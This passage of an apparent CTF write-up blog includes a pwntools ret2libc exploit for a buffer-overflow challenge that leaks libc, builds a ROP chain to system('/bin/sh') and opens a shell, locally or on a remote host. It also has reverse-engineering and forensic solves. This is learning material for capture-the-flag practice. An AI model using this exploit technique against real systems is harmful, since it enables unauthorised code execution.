class="built_in">printf</span>(<span class="string">&quot;\n  #############################################\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #                stack state                #\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #############################################\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;                 hex           string\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_READ_LEN; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; +0x%02x | 0x%016lx | &quot;</span>, i, *(<span class="type">unsigned</span> <span class="type">long</span> *)(buf + i));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt; <span class="number">-1</span>; j--) &#123;</span><br><span class="line">      <span class="type">char</span> c = *(<span class="type">char</span> *)(buf + i + j);</span><br><span class="line">      <span class="keyword">if</span> (c &gt; <span class="number">0x7e</span> || c &lt; <span class="number">0x20</span>)</span><br><span class="line">        c = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">40</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; | &lt;- TARGET!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; |\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ofs = <span class="number">0</span>, ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you master ROP?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (ofs &lt; MAX_READ_LEN) &#123;</span><br><span class="line">    show_stack(buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your input (max. %d bytes) &gt; &quot;</span>, MAX_READ_LEN - ofs);</span><br><span class="line">    ret = read(<span class="number">0</span>, buf + ofs, MAX_READ_LEN - ofs);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    ofs += ret;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>running binary</p>
<p><img src="/imgs/post4/pwn/ret2libc_run.png" alt="ret2libc"></p>
<p>leak the libc adress we can use this to calculate the base of libc </p>
<h4 id="Exploit-5"><a href="#Exploit-5" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;chall_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)  </span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span> </span><br><span class="line">offset = <span class="number">40</span> </span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27; continue &#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">## Allows you to switch between local/GDB/remote from terminal</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## leaking libc</span></span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot; +0x28 | &quot;</span>)</span><br><span class="line">    leak1 = r.recvline().split(<span class="string">b&quot;|&quot;</span>)[<span class="number">0</span>].strip()  </span><br><span class="line">    leak1 = <span class="built_in">int</span>(leak1,<span class="number">16</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;leak1 : &quot;</span>, <span class="built_in">hex</span>(leak1)) </span><br><span class="line"></span><br><span class="line">    <span class="comment">## calculating libc base</span></span><br><span class="line">    <span class="comment">#libc.address = leak1 - (libc.symbols[&#x27;__libc_start_call_main&#x27;]+128) </span></span><br><span class="line">    libc.address = leak1 - <span class="number">0x29d90</span> <span class="comment"># libc offset </span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc base : &quot;</span>, <span class="built_in">hex</span>(libc.address)) </span><br><span class="line">    </span><br><span class="line">   <span class="comment">## addresses </span></span><br><span class="line">    ret = <span class="number">0x0000000040101a</span></span><br><span class="line">    pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)) </span><br><span class="line">    system = libc.sym.system </span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">&quot;pop_rdi : 0x%x&quot;</span>%pop_rdi) </span><br><span class="line">    log.info(<span class="string">&quot;bin_sh : 0x%x&quot;</span>%bin_sh) </span><br><span class="line">    log.info(<span class="string">&quot;system : 0x%x&quot;</span>%system) </span><br><span class="line">    </span><br><span class="line">    payload1 = cyclic(<span class="number">40</span>) + pack(ret) + pack(pop_rdi) + pack(bin_sh) + pack(system)</span><br><span class="line">    <span class="comment">#payload2 = cyclic(40) + pack(libc.address + 0xebcf8)</span></span><br><span class="line"></span><br><span class="line">    r.sendline(payload1.ljust(<span class="number">128</span>,<span class="string">b&quot;i&quot;</span>))</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="time-table"><a href="#time-table" class="headerlink" title="time table"></a>time table</h3><p>zzzzzzzzzzzz</p>
<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="Just-Passw0rd"><a href="#Just-Passw0rd" class="headerlink" title="Just_Passw0rd"></a>Just_Passw0rd</h3><p><img src="/imgs/post4/rev/just_password.png" alt="just_password"></p>
<h3 id="javersing"><a href="#javersing" class="headerlink" title="javersing"></a>javersing</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javersing</span> &#123;  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] paramArrayOfString)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;Fcn_yDlvaGpj_Logi&#125;eias&#123;iaeAm_s&quot;</span>;  </span><br><span class="line">    <span class="type">boolean</span> <span class="variable">bool</span> <span class="operator">=</span> <span class="literal">true</span>;  </span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);  </span><br><span class="line">    System.out.println(<span class="string">&quot;Input password: &quot;</span>);  </span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> scanner.nextLine();  </span><br><span class="line">    str2 = String.format(<span class="string">&quot;%30s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; str2 &#125;).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;0&quot;</span>);  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>; b &lt; <span class="number">30</span>; b++) &#123;  </span><br><span class="line">      <span class="keyword">if</span> (str2.charAt(b * <span class="number">7</span> % <span class="number">30</span>) != str1.charAt(b))  </span><br><span class="line">        bool = <span class="literal">false</span>;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (bool) &#123;  </span><br><span class="line">      System.out.println(<span class="string">&quot;Correct!&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">      System.out.println(<span class="string">&quot;Incorrect...&quot;</span>);  </span><br><span class="line">    &#125;   </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>okay i didn’t figure out this challenge at run time but later got to realize i just had to find the inverse of 7 modulo 30 to reverse the logic </p>
<p>To find the inverse of 7 modulo 30, we need to find a number x such that:</p>
<p>7x ≡ 1 (mod 30)</p>
<p>In other words, we are looking for a number x such that when we multiply 7 by x and then take the result modulo 30, we get a remainder of 1.<br>One way to solve this is to use the extended Euclidean algorithm. We can write:</p>
<p>30 &#x3D; 4 × 7 + 2 7 &#x3D; 3 × 2 + 1</p>
<p>Now we can work backwards to find the values of x and y that satisfy:</p>
<p>1 &#x3D; 7 − 3 × 2 1 &#x3D;&gt; 7 − 3(30 − 4 × 7) 1 &#x3D;&gt; 13 × 7 − 3 × 30</p>
<p>Therefore, the inverse of 7 modulo 30 is 13. In other words, 7 and 13 are multiplicative inverses modulo 30, since:</p>
<p>7 × 13 ≡ 1 (mod 30)</p>
<h4 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h4><p><img src="/imgs/post4/rev/javersing.png" alt="javaversing"></p>
<h3 id="fermat"><a href="#fermat" class="headerlink" title="fermat"></a>fermat</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_flag</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_bc;</span><br><span class="line">  undefined4 local_b8 [<span class="number">20</span>];</span><br><span class="line">  undefined8 local_68;</span><br><span class="line">  </span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_b8[<span class="number">0</span>] = <span class="number">0xf781fc86</span>;</span><br><span class="line">  local_b8[<span class="number">1</span>] = <span class="number">0xc5afc9bb</span>;</span><br><span class="line">  local_b8[<span class="number">2</span>] = <span class="number">0xd5a5de9f</span>;</span><br><span class="line">  local_b8[<span class="number">3</span>] = <span class="number">0xefa1efa4</span>;</span><br><span class="line">  local_b8[<span class="number">4</span>] = <span class="number">0xefb4dfac</span>;</span><br><span class="line">  local_b8[<span class="number">5</span>] = <span class="number">0xc49fd6af</span>;</span><br><span class="line">  local_b8[<span class="number">6</span>] = <span class="number">0xefa5dda9</span>;</span><br><span class="line">  local_b8[<span class="number">7</span>] = <span class="number">0xefa4dea1</span>;</span><br><span class="line">  local_b8[<span class="number">8</span>] = <span class="number">0xdfa6d6a5</span>;</span><br><span class="line">  local_b8[<span class="number">9</span>] = <span class="number">0xc49fc4b2</span>;</span><br><span class="line">  local_b8[<span class="number">10</span>] = <span class="number">0xdfb3efaf</span>;</span><br><span class="line">  local_b8[<span class="number">11</span>] = <span class="number">0xefa5c6ac</span>;</span><br><span class="line">  local_b8[<span class="number">12</span>] = <span class="number">0xd5b6d5b2</span>;</span><br><span class="line">  local_b8[<span class="number">13</span>] = <span class="number">0xdea9c3b2</span>;</span><br><span class="line">  local_b8[<span class="number">14</span>] = <span class="number">0x80f2efa7</span>;</span><br><span class="line">  local_b8[<span class="number">15</span>] = <span class="number">0x87f4d2f8</span>;</span><br><span class="line">  local_b8[<span class="number">16</span>] = <span class="number">0x86f6d4a2</span>;</span><br><span class="line">  local_b8[<span class="number">17</span>] = <span class="number">0xd4a382a3</span>;</span><br><span class="line">  local_b8[<span class="number">18</span>] = <span class="number">0xb0c0cdf8</span>;</span><br><span class="line">  local_68 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (local_bc = <span class="number">0</span>; local_bc &lt; <span class="number">0x13</span>; local_bc = local_bc + <span class="number">1</span>) &#123;</span><br><span class="line">    *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)(local_bc &lt;&lt; <span class="number">2</span>)) = (byte)local_b8[local_bc] ^ <span class="number">0xc0</span>;</span><br><span class="line">    *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)(local_bc * <span class="number">4</span> + <span class="number">1</span>)) =</span><br><span class="line">         (byte)((uint)local_b8[local_bc] &gt;&gt; <span class="number">8</span>) ^ <span class="number">0xb0</span>;</span><br><span class="line">    *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)(local_bc * <span class="number">4</span> + <span class="number">2</span>)) =</span><br><span class="line">         (byte)((uint)local_b8[local_bc] &gt;&gt; <span class="number">0x10</span>) ^ <span class="number">0xc0</span>;</span><br><span class="line">    *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)(local_bc * <span class="number">4</span> + <span class="number">3</span>)) =</span><br><span class="line">         (byte)((uint)local_b8[local_bc] &gt;&gt; <span class="number">0x18</span>) ^ <span class="number">0xb0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>((<span class="type">char</span> *)&amp;local_68);</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_flag</span>():</span><br><span class="line">    local_b8 = [<span class="number">0xf781fc86</span>, <span class="number">0xc5afc9bb</span>, <span class="number">0xd5a5de9f</span>, <span class="number">0xefa1efa4</span>, <span class="number">0xefb4dfac</span>,</span><br><span class="line">                <span class="number">0xc49fd6af</span>, <span class="number">0xefa5dda9</span>, <span class="number">0xefa4dea1</span>, <span class="number">0xdfa6d6a5</span>, <span class="number">0xc49fc4b2</span>,</span><br><span class="line">                <span class="number">0xdfb3efaf</span>, <span class="number">0xefa5c6ac</span>, <span class="number">0xd5b6d5b2</span>, <span class="number">0xdea9c3b2</span>, <span class="number">0x80f2efa7</span>,</span><br><span class="line">                <span class="number">0x87f4d2f8</span>, <span class="number">0x86f6d4a2</span>, <span class="number">0xd4a382a3</span>, <span class="number">0xb0c0cdf8</span>]</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> local_b8:</span><br><span class="line">        flag += <span class="built_in">chr</span>((val &amp; <span class="number">0xff</span>) ^ <span class="number">0xc0</span>)</span><br><span class="line">        flag += <span class="built_in">chr</span>(((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) ^ <span class="number">0xb0</span>)</span><br><span class="line">        flag += <span class="built_in">chr</span>(((val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) ^ <span class="number">0xc0</span>)</span><br><span class="line">        flag += <span class="built_in">chr</span>(((val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>) ^ <span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line">print_flag() </span><br></pre></td></tr></table></figure>


<h3 id="theseus"><a href="#theseus" class="headerlink" title="theseus"></a>theseus</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  undefined8 uVar3;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_68;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> local_60;</span><br><span class="line">  <span class="type">char</span> local_48 [<span class="number">56</span>];</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  iVar2 = getpagesize();</span><br><span class="line">  mprotect((<span class="type">void</span> *)((<span class="type">long</span>)-iVar2 &amp; <span class="number">0x4011e9</span>),(<span class="type">long</span>)iVar2,<span class="number">7</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input flag: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00402011);</span><br><span class="line">  local_68 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">3</span> &lt; i) &#123;</span><br><span class="line">      local_68 = (i * <span class="number">0xb</span>) % <span class="number">0xf</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cVar1 = (<span class="type">char</span>)local_68;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">8</span>) &#123;</span><br><span class="line">      compare[i + <span class="number">0x25</span>] = (code)((<span class="type">char</span>)compare[i + <span class="number">0x25</span>] + cVar1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (i &lt; <span class="number">0x10</span>) &#123;</span><br><span class="line">        compare[i + <span class="number">0x27</span>] = (code)((<span class="type">char</span>)compare[i + <span class="number">0x27</span>] + cVar1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0x18</span>) &#123;</span><br><span class="line">          compare[i + <span class="number">0x31</span>] = (code)((<span class="type">char</span>)compare[i + <span class="number">0x31</span>] + cVar1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          compare[i + <span class="number">0x39</span>] = (code)((<span class="type">char</span>)compare[i + <span class="number">0x39</span>] + cVar1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  local_60 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x19</span> &lt; local_60) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">      uVar3 = <span class="number">0</span>;</span><br><span class="line">LAB_00401478:</span><br><span class="line">      <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">        __stack_chk_fail();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> uVar3;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar2 = compare((<span class="type">int</span>)local_48[local_60],local_60);</span><br><span class="line">    <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Incorrect.&quot;</span>);</span><br><span class="line">      uVar3 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_00401478;</span><br><span class="line">    &#125;</span><br><span class="line">    local_60 = local_60 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&quot;./chall&quot;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x401467</span></span>)  </span><span class="comment"># Target address</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_flag</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;VALID INPUT:&quot;</span>, state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    project.terminate_execution()</span><br><span class="line"></span><br><span class="line">project.execute()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Just-mp4"><a href="#Just-mp4" class="headerlink" title="Just_mp4"></a>Just_mp4</h3><p><img src="/imgs/post4/forensic/just_mp4.gif" alt="just_mp4"></p>
<h3 id="whats-happening"><a href="#whats-happening" class="headerlink" title="whats_happening"></a>whats_happening</h3><p>file <code>updog</code> is likely an ISO image file. ISO 9660 is a standard file system for optical disc media, such as CD-ROMs and DVD-ROMs, and the “ISO Label” indicates that the ISO file has been created according to ISO standards.</p>
<p>we can mount this ISO file as follows</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> ~/iso_mount</span><br><span class="line">$ sudo mount -o loop updog ~/iso_mount</span><br></pre></td></tr></table></figure>

<p>after mounting </p>
<p><img src="/imgs/post4/forensic/whats_happening.gif" alt="whats_happening"></p>
<h3 id="lowkey-messedup"><a href="#lowkey-messedup" class="headerlink" title="lowkey_messedup"></a>lowkey_messedup</h3><p>pcap file given this time opening the file on wireshark we see that its USB based pcap file, now as there are USB-Mouse&#x2F; Keyboard and Storage devices. There would be data related to that to figure out if device connected is the keyboard, we can actually, check for the “interrupt in” info section and data below <strong>Leftover Capture Data</strong>  </p>
<p><img src="/imgs/post4/forensic/lowkey_messedup.png" alt="lowkey_messedup"></p>
<p>extracting these data from each packet </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r chall.pcap -T fields -e usb.capdata &gt; data.txt</span><br></pre></td></tr></table></figure>

<p>and magic (got through this <a target="_blank" rel="noopener" href="https://blog.stayontarget.org/2019/03/decoding-mixed-case-usb-keystrokes-from.html">blog</a>)</p>
<p><img src="/lowkey_messedup_flag.png" alt="lowkey_messedup_flag"></p>
